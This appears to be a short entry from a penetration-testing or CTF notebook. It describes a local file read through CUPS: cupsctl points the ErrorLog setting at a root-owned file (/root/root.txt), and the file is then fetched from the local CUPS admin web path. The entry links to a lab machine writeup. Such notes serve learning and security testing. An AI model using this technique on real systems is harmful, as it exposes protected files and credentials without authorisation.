### LFI
An LFI is present if you have access to the system, you need to change the ErrorLog path for the file that you want to read:
```bash
cupsctl ErrorLog="/root/root.txt"
```
Then from the web server we need to go to the following path:
```bash
http://localhost:631/admin/log/error_log?
```
Examples:
[[Antique#^4440dd]]